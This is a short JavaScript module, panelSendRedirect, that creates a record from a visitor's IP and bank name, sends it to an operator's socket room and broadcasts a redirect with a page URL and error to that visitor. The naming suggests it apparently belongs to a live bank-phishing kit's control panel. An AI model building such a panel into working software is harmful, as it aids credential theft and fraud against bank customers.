import { createBagIp } from "../../bag/index.mjs"

export const panelSendRedirect = async({ip, nameBank, urlPage, errorBag, io, socket, specialInfo}) => {
    const bag = await createBagIp({ip, nameBank, specialInfo})
    io.to(bag?.userRef?.toString()).emit('[bag] newBag', bag)
    return socket.broadcast.to(ip).emit('[live] bagWaitRedirect', {urlPage, errorBag})

}
